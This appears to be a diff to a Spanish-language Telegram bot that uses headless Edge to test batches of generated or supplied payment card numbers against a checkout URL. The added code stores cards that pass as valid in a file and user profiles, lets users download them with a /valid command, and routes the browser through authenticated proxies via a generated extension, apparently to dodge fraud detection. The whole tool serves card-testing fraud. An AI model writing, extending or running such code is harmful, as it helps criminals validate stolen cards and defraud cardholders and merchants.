@@ -1,10 +1,13 @@
 import os
+import io
 import re
 import sys
 import time
 import json
 import html
 import random
+import zipfile
+import tempfile
 import asyncio
 import datetime
 import threading
@@ -47,6 +50,7 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 USER_DATA_FILE = os.path.join(BASE_DIR, "user_data.json")
 LOG_FILE = os.path.join(BASE_DIR, "debug.log")
 DEFAULT_CARDS_FILE = os.path.join(BASE_DIR, "a.txt")
+VALIDAS_FILE = os.path.join(BASE_DIR, "validas.txt")
 
 # Sincronización de log
 print_lock = threading.Lock()
@@ -64,6 +68,26 @@ def registrar_log(bot_id, num_tarjeta, estado, mensaje):
                 f.write(linea)
         except Exception:
             pass
+
+def guardar_tarjeta_valida_archivo(card_str: str, url: str = ""):
+    """Guarda la tarjeta válida en validas.txt asegurando unicidad."""
+    try:
+        with print_lock:
+            tarjetas_existentes = set()
+            if os.path.exists(VALIDAS_FILE):
+                with open(VALIDAS_FILE, "r", encoding="utf-8") as f:
+                    for linea in f:
+                        linea_limpia = linea.strip()
+                        if linea_limpia and not linea_limpia.startswith("#"):
+                            num = linea_limpia.split("|")[0].strip()
+                            tarjetas_existentes.add(num)
+
+            num_actual = card_str.split("|")[0].strip()
+            if num_actual not in tarjetas_existentes:
+                with open(VALIDAS_FILE, "a", encoding="utf-8") as f:
+                    f.write(f"{card_str}\n")
+    except Exception as e:
+        print(f"[!] Error guardando tarjeta válida en archivo: {e}")
 
 # =====================================================================
 # GESTIÓN DE USUARIOS Y URLs INDEPENDIENTES
@@ -111,6 +135,49 @@ class UserManager:
             uid = str(user_id)
             if uid in self.data and "url" in self.data[uid]:
                 del self.data[uid]["url"]
+                self._save()
+
+    def add_valid_card(self, user_id: int, card_str: str, url: str):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data:
+                self.data[uid] = {}
+            if "valid_cards" not in self.data[uid]:
+                self.data[uid]["valid_cards"] = []
+
+            entry = {
+                "card": card_str,
+                "url": url,
+                "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            if not any(c.get("card") == card_str for c in self.data[uid]["valid_cards"]):
+                self.data[uid]["valid_cards"].append(entry)
+            self._save()
+
+    def get_valid_cards(self, user_id: int) -> List[dict]:
+        with self.lock:
+            uid = str(user_id)
+            return list(self.data.get(uid, {}).get("valid_cards", []))
+
+    def set_proxy(self, user_id: int, proxy_dict: dict):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data:
+                self.data[uid] = {}
+            self.data[uid]["proxy"] = proxy_dict
+            self.data[uid]["proxy_updated_at"] = datetime.datetime.now().isoformat()
+            self._save()
+
+    def get_proxy(self, user_id: int) -> Optional[dict]:
+        with self.lock:
+            uid = str(user_id)
+            return self.data.get(uid, {}).get("proxy")
+
+    def delete_proxy(self, user_id: int):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data and "proxy" in self.data[uid]:
+                del self.data[uid]["proxy"]
                 self._save()
 
 user_manager = UserManager()
@@ -247,14 +314,136 @@ def generar_30_tarjetas(prefix_10: str, p4: str = "0329", p3: str = "458") -> Li
 
     return tarjetas
 
+def parsear_proxy(texto: str) -> Optional[dict]:
+    """
+    Parsea cadenas de proxy en múltiples formatos:
+      - curl -x http://user:pass@gw.dataimpulse.com:823
+      - http://user:pass@gw.dataimpulse.com:823
+      - gw.dataimpulse.com:823:user:pass
+      - user:pass@gw.dataimpulse.com:823
+      - host:port
+    Retorna dict con 'scheme', 'host', 'port', 'user', 'pass' o None.
+    """
+    if not texto:
+        return None
+    t = texto.strip()
+    t = re.sub(r"^(curl\s+)?(-x|--proxy)\s+", "", t, flags=re.IGNORECASE).strip()
+    t = t.strip("\"' ")
+
+    scheme = "http"
+    if "://" in t:
+        scheme, rest = t.split("://", 1)
+        scheme = scheme.lower()
+    else:
+        rest = t
+
+    # Formato con autenticación arroba: user:pass@host:port
+    if "@" in rest:
+        auth_part, host_part = rest.split("@", 1)
+        user_pass = auth_part.split(":", 1)
+        user = user_pass[0].strip()
+        passwd = user_pass[1].strip() if len(user_pass) > 1 else ""
+
+        host_port = host_part.split(":", 1)
+        host = host_port[0].strip()
+        port = host_port[1].strip() if len(host_port) > 1 else "823"
+        if host and port:
+            return {"scheme": scheme, "host": host, "port": port, "user": user, "pass": passwd}
+
+    # Formato con dos puntos: host:port:user:pass o host:port
+    parts = rest.split(":")
+    if len(parts) >= 4:
+        return {
+            "scheme": scheme,
+            "host": parts[0].strip(),
+            "port": parts[1].strip(),
+            "user": parts[2].strip(),
+            "pass": ":".join(parts[3:]).strip()
+        }
+    elif len(parts) == 2:
+        return {
+            "scheme": scheme,
+            "host": parts[0].strip(),
+            "port": parts[1].strip(),
+            "user": "",
+            "pass": ""
+        }
+
+    return None
+
+def generar_extension_proxy(proxy_info: dict) -> str:
+    """Genera una extensión ZIP temporal para autenticar proxy en Edge/Chromium."""
+    manifest_json = """{
+    "version": "1.0.0",
+    "manifest_version": 2,
+    "name": "Edge Proxy Auth",
+    "permissions": [
+        "proxy",
+        "tabs",
+        "unlimitedStorage",
+        "storage",
+        "<all_urls>",
+        "webRequest",
+        "webRequestBlocking"
+    ],
+    "background": {
+        "scripts": ["background.js"]
+    }
+}"""
+    background_js = """
+var config = {
+    mode: "fixed_servers",
+    rules: {
+      singleProxy: {
+        scheme: "%(scheme)s",
+        host: "%(host)s",
+        port: parseInt(%(port)s)
+      },
+      bypassList: ["localhost"]
+    }
+  };
+chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
+function callbackFn(details) {
+    return {
+        authCredentials: {
+            username: "%(user)s",
+            password: "%(pass)s"
+        }
+    };
+}
+chrome.webRequest.onAuthRequired.addListener(
+    callbackFn,
+    {urls: ["<all_urls>"]},
+    ['blocking']
+);
+""" % proxy_info
+
+    temp_dir = tempfile.gettempdir()
+    plugin_path = os.path.join(temp_dir, f"proxy_auth_{os.getpid()}_{random.randint(1000, 9999)}.zip")
+    with zipfile.ZipFile(plugin_path, "w") as zp:
+        zp.writestr("manifest.json", manifest_json)
+        zp.writestr("background.js", background_js)
+    return plugin_path
+
 # =====================================================================
 # MOTOR SELENIUM (EDGE)
 # =====================================================================
 
-def crear_driver(es_headless=True):
-    """Crea una instancia de Edge WebDriver optimizada."""
+def crear_driver(es_headless=True, proxy_info=None):
+    """Crea una instancia de Edge WebDriver optimizada con soporte opcional de proxy."""
     edge_options = Options()
     edge_options.page_load_strategy = 'eager'
+
+    ext_creada = None
+    if proxy_info:
+        if proxy_info.get("user") and proxy_info.get("pass"):
+            try:
+                ext_creada = generar_extension_proxy(proxy_info)
+                edge_options.add_extension(ext_creada)
+            except Exception as e:
+                print(f"[!] Error cargando extensión de proxy: {e}")
+        else:
+            edge_options.add_argument(f"--proxy-server={proxy_info['scheme']}://{proxy_info['host']}:{proxy_info['port']}")
 
     if es_headless:
         edge_options.add_argument("--headless=new")
@@ -272,6 +461,7 @@ def crear_driver(es_headless=True):
     edge_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")
 
     driver = webdriver.Edge(options=edge_options)
+    driver._proxy_extension_path = ext_creada
     driver.set_page_load_timeout(18)
     driver.set_script_timeout(10)
     return driver
@@ -280,6 +470,13 @@ def cerrar_driver_seguro(driver, bot_id=1, num_tarjeta=""):
     """Cierra el driver de forma segura y garantiza liberación de recursos."""
     if not driver:
         return
+
+    ext_path = getattr(driver, '_proxy_extension_path', None)
+    if ext_path and os.path.exists(ext_path):
+        try:
+            os.remove(ext_path)
+        except Exception:
+            pass
 
     registrar_log(bot_id, num_tarjeta, "CERRANDO", "Cerrando navegador...")
     driver_pid = None
@@ -789,6 +986,10 @@ def ejecutar_proceso_chequeo(chat_id: int, user_id: int, url: str, tarjetas: Lis
                 url_final = url_redireccion or url
                 prefix_10 = p16[:10]
 
+                # Guardar en archivo persistente validas.txt y en perfil de usuario
+                guardar_tarjeta_valida_archivo(card_str, url_final)
+                user_manager.add_valid_card(user_id, card_str, url_final)
+
                 # Registrar la tarjeta válida en memoria para el generador
                 user_valid_cards[user_id] = {
                     'p16': p16,
@@ -867,6 +1068,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"▫️ <b><code>/chk</code></b> ➔ <b><code>Iniciar chequeo (+100 tarjetas sin límite)</code></b>\n"
         f"▫️ <b><code>/chk &lt;tarjetas&gt;</code></b> ➔ <b><code>Chequeo rápido directo</code></b>\n"
         f"▫️ <b><code>/gen &lt;10_dígitos&gt;</code></b> ➔ <b><code>Generar 30 tarjetas aleatorias</code></b>\n"
+        f"▫️ <b><code>/valid</code></b> ➔ <b><code>Descargar todas las válidas en .txt</code></b>\n"
         f"▫️ <b><code>/url &lt;enlace&gt;</code></b> ➔ <b><code>Guardar o cambiar tu URL</code></b>\n"
         f"▫️ <b><code>/url</code></b> ➔ <b><code>Consultar tu URL configurada</code></b>\n"
         f"▫️ <b><code>/stop</code></b> ➔ <b><code>Detener el chequeo en curso</code></b>\n\n"
@@ -1319,6 +1521,67 @@ async def manejar_callback_acciones_valida(update: Update, context: ContextTypes
             reply_markup=reply_markup
         )
 
+async def cmd_valid(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Comando /valid:
+    - Envía todas las tarjetas válidas registradas en un archivo de texto .txt.
+    """
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+
+    lineas_validas = []
+
+    # 1. Obtener tarjetas del perfil del usuario
+    tarjetas_user = user_manager.get_valid_cards(user_id)
+    for item in tarjetas_user:
+        card = item.get("card", "").strip()
+        if card and card not in lineas_validas:
+            lineas_validas.append(card)
+
+    # 2. Leer desde validas.txt para asegurar que se recopilen todas las válidas
+    if os.path.exists(VALIDAS_FILE):
+        try:
+            with open(VALIDAS_FILE, "r", encoding="utf-8") as f:
+                for line in f:
+                    c = line.strip()
+                    if c and not c.startswith("#") and c not in lineas_validas:
+                        lineas_validas.append(c)
+        except Exception as e:
+            print(f"[!] Error leyendo validas.txt: {e}")
+
+    if not lineas_validas:
+        await update.message.reply_text(
+            f"⚠️ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+            f"⚠️ <b><code>║       SIN TARJETAS VÁLIDAS            ║</code></b>\n"
+            f"⚠️ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+            f"ℹ️ <b><code>Aún no se ha detectado ninguna tarjeta válida.</code></b>\n\n"
+            f"💡 <b><code>Ejecuta /chk para comenzar el chequeo de tarjetas.</code></b>",
+            parse_mode="HTML"
+        )
+        return
+
+    # Preparar el archivo txt en memoria
+    contenido_txt = "\n".join(lineas_validas) + "\n"
+    archivo_bio = io.BytesIO(contenido_txt.encode("utf-8"))
+    archivo_bio.name = "validas.txt"
+
+    caption = (
+        f"✅ <b><code>╔════════════════════════════════════════╗</code></b>\n"
+        f"✅ <b><code>║     REPORTE DE TARJETAS VÁLIDAS       ║</code></b>\n"
+        f"✅ <b><code>╚════════════════════════════════════════╝</code></b>\n\n"
+        f"📊 <b><code>TOTAL VÁLIDAS:</code></b> <b><code>{len(lineas_validas)} encontradas</code></b>\n"
+        f"📁 <b><code>ARCHIVO:</code></b> <code>validas.txt</code>\n\n"
+        f"⚡ <b><code>Descarga el archivo adjunto para ver todas tus válidas.</code></b>"
+    )
+
+    await context.bot.send_document(
+        chat_id=chat_id,
+        document=archivo_bio,
+        filename="validas.txt",
+        caption=caption,
+        parse_mode="HTML"
+    )
+
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Detiene el chequeo en curso del usuario."""
     user_id = update.effective_user.id
@@ -1362,6 +1625,7 @@ def main():
     app.add_handler(CommandHandler("help", cmd_start))
     app.add_handler(CommandHandler("chk", cmd_chk))
     app.add_handler(CommandHandler("gen", cmd_gen))
+    app.add_handler(CommandHandler("valid", cmd_valid))
     app.add_handler(CommandHandler("url", cmd_url))
     app.add_handler(CommandHandler("stop", cmd_stop))
 
